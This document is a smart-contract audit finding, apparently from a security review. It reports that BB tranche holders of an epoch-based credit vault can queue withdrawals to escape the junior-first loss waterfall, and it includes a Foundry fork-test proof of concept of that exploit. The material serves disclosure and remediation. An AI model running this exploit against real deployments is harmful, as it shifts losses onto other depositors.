### Title

Queued BB withdrawals escape the junior-first loss waterfall - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary

`IdleCDOEpochVariant.requestWithdraw` removes a tranche position from live NAV and converts it into an aggregate, tranche-agnostic withdrawal receipt. When the next epoch realizes a loss, `previewLossAdjustedWithdrawFunds` assigns the pending-receipt bucket only a pro-rata share of the total loss, while the remaining loss is applied to active positions using the BB-first waterfall. A BB holder can therefore request withdrawal during the buffer, wait for a loss, and claim substantially more than they would have retained had their position remained junior.

### Finding Description

During an allowed withdrawal period, `requestWithdraw` prices the BB tranche before the subsequent epoch loss, calculates the receipt amount, records it through `IdleCreditVault.requestWithdraw`, and removes the position from live NAV through `_withdrawOps`. [1](#0-0) 

The strategy stores the claim in `withdrawsRequestsByEpoch[user][currentEpoch]`, but that accounting does not retain whether the receipt originated from AA or BB. [2](#0-1) 

At the following `stopEpochWithDuration`, the loss split uses `pendingBasis / (activeBasis + pendingBasis)` for all pending receipts and assigns only `activeLoss` to live tranche holders. [3](#0-2)  The CDO explicitly treats the active remainder with the ordinary BB-first waterfall and burns that amount after funding the adjusted pending claims. [4](#0-3) [5](#0-4) 

For example, with AA NAV of 50, BB NAV of 50, and a BB holder requesting withdrawal of 10, a subsequent loss of 40 produces a pending-receipt loss of `40 * 10 / 100 = 4` and an active loss of 36. The requester receives 6 instead of the zero they would retain as an active BB holder after BB absorbs the first 40 units of loss. [6](#0-5) [7](#0-6) 

### Impact Explanation

This breaks the junior-loss invariant: a BB holder can convert junior exposure into blended AA/BB exposure after the risk window has effectively closed but before the epoch loss is crystallized. The user’s excess payout is borne by remaining BB holders first and AA holders after BB is exhausted, producing direct loss transfer equal to the escaped junior haircut.

In the 50 AA / 50 BB example, a 10-unit BB withdrawal converts a zero recovery into a 6-unit claim on a 40-unit loss; the incremental 6 units are socialized across the remaining active pool. [3](#0-2) 

### Likelihood Explanation

Withdrawal requests are deliberately enabled during the buffer and only require `allowBBWithdrawRequest` and wallet eligibility. [8](#0-7)  The attack requires no privileged action and is rational whenever a BB holder anticipates borrower underpayment or a realized loss in the next epoch; the worst-case cost is waiting through the normal withdrawal lifecycle plus applicable withdrawal fees. [9](#0-8) 

The existing loss-adjusted receipt mechanism does not close the issue because it haircuts the aggregate pending bucket pro rata rather than applying the loss according to each receipt’s original tranche seniority. [10](#0-9) [7](#0-6) 

### Recommendation

Preserve tranche identity for each withdrawal request, for example with `withdrawsRequestsByEpoch[user][epoch][tranche]`, and calculate each receipt’s loss using the same waterfall that would have applied had the tranche remained active until loss realization.

Alternatively, keep a per-epoch AA/BB pending basis and apply `_lossAmount` to the combined end-state waterfall first: assign losses to BB claims and active BB until exhausted, then to AA claims and active AA. Do not pool AA and BB withdrawal basis into a single pro-rata bucket unless withdrawals are intentionally seniority-neutral, which would conflict with the stated BB-first active-loss policy. [11](#0-10) [12](#0-11) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract PendingWithdrawalLossEscapeTest is Test {
    IdleCDOEpochVariant cdo;
    IdleCreditVault vault;
    IERC20Detailed underlying;
    IERC20Detailed bb;

    address manager;
    address borrower;
    address alice;

    uint256 constant AA_NAV = 50e6;
    uint256 constant BB_NAV = 50e6;
    uint256 constant ALICE_BB = 10e6;
    uint256 constant LOSS = 40e6;

    function testBBRequestEscapesJuniorWaterfall() public {
        // Fork an initialized deployment in the buffer phase where:
        // - AA NAV == 50e6
        // - BB NAV == 50e6
        // - alice is wallet-allowed and owns 10e6 BB
        // - borrower and manager are honest test-controlled roles.
        vm.createSelectFork(vm.envString("FORK_RPC_URL"));

        cdo = IdleCDOEpochVariant(vm.envAddress("CDO"));
        vault = IdleCreditVault(cdo.strategy());
        underlying = IERC20Detailed(cdo.token());
        bb = IERC20Detailed(cdo.BBTranche());
        manager = vault.manager();
        borrower = vault.borrower();
        alice = vm.envAddress("ALLOWED_BB_HOLDER");

        assertEq(bb.balanceOf(alice), ALICE_BB);
        assertEq(cdo.isEpochRunning(), false);
        assertTrue(cdo.allowBBWithdrawRequest());
        assertTrue(cdo.isWalletAllowed(alice));

        uint256 requestEpoch = vault.epochNumber();
        uint256 activeBasisBefore = cdo.getContractValue();

        // Alice converts 10 units of junior exposure into an aggregate receipt.
        vm.prank(alice);
        uint256 receiptAmount = cdo.requestWithdraw(ALICE_BB, address(bb));

        assertEq(bb.balanceOf(alice), 0);
        assertEq(
            vault.withdrawsRequestsByEpoch(alice, requestEpoch),
            receiptAmount
        );
        assertEq(vault.pendingWithdraws(), receiptAmount);

        // Honest manager starts the epoch after the buffer.
        vm.prank(manager);
        cdo.startEpoch();
        vm.warp(cdo.epochEndDate() + 1);

        // The borrower funds interest plus only the loss-adjusted pending amount.
        (uint256 pendingToFund, uint256 activeLoss) =
            vault.previewLossAdjustedWithdrawFunds(LOSS);
        uint256 amountToPull =
            cdo.expectedEpochInterest() + pendingToFund;

        deal(address(underlying), borrower, amountToPull);
        vm.prank(borrower);
        underlying.approve(address(cdo), amountToPull);

        vm.prank(manager);
        cdo.stopEpochWithDuration(0, 0, cdo.epochDuration(), LOSS);

        // For 100 total basis, Alice's 10-unit pending receipt bears only 4
        // units of the 40-unit loss, leaving 6 claimable.
        assertEq(pendingToFund, 6e6);
        assertEq(activeLoss, 36e6);

        uint256 before = underlying.balanceOf(alice);
        vm.prank(alice);
        cdo.claimWithdrawRequest();

        assertEq(underlying.balanceOf(alice) - before, 6e6);

        // Had Alice stayed in BB, the entire 40-unit loss would have hit BB
        // first and her 10-unit position would have recovered zero.
        uint256 aliceIfSheStayed =
            LOSS >= BB_NAV ? 0 : ALICE_BB * (BB_NAV - LOSS) / BB_NAV;
        assertEq(aliceIfSheStayed, 0);

        assertLt(
            cdo.getContractValue(),
            activeBasisBefore - (LOSS - (receiptAmount - pendingToFund))
        );
    }
}
```

The decisive assertion is `pendingToFund == 6e6`: the active portfolio receives a 36-unit junior-first loss, while Alice’s otherwise-fully-impaired BB position receives a blended 10% haircut and recovers 6 units. [3](#0-2) [7](#0-6)

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L391-393)
```text
    // Pending receipts have no tranche identity, so their aggregate loss is pro rata across all
    // receipts. The remaining active loss is applied BB-first after the stop succeeds.
    (_pendingWithdraws, _lossAmount) = _strategy.previewLossAdjustedWithdrawFunds(_lossAmount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L496-499)
```text
      if (_lossAmount != 0) {
        _strategy.burnStrategyTokens(_lossAmount);
        // Realize the active loss immediately through the ordinary BB-first waterfall.
        _forceUpdateAccounting();
```

**File:** contracts/IdleCDOEpochVariant.sol (L510-515)
```text
  /// Loss accounting policy for `_lossAmount`:
  /// - pending receipts share the pending portion of the loss pro rata because tranche identity is not stored
  /// - the remaining active-position loss uses the ordinary BB-first tranche waterfall
  /// - hard borrower defaults instead apply one aggregate recovery multiplier to active and pending claims
  /// - if `stopEpoch` defaults (`defaulted = true`), the post-stop loss burn and epoch updates are skipped,
  ///   but variant hooks still run so prefunded queues can settle deposits already sent to the borrower
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-294)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-421)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L432-436)
```text
  /// @notice Preview how a realized stop-epoch loss is split between active LPs and pending receipts.
  /// @dev Without pending receipts, a loss cannot exceed its active basis. When pending receipts
  /// exist, all pending receipts share their aggregate portion of the loss pro rata because the
  /// pending bucket does not retain tranche identity. The remaining active loss is later applied
  /// by the CDO through its ordinary BB-first waterfall.
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L440-459)
```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
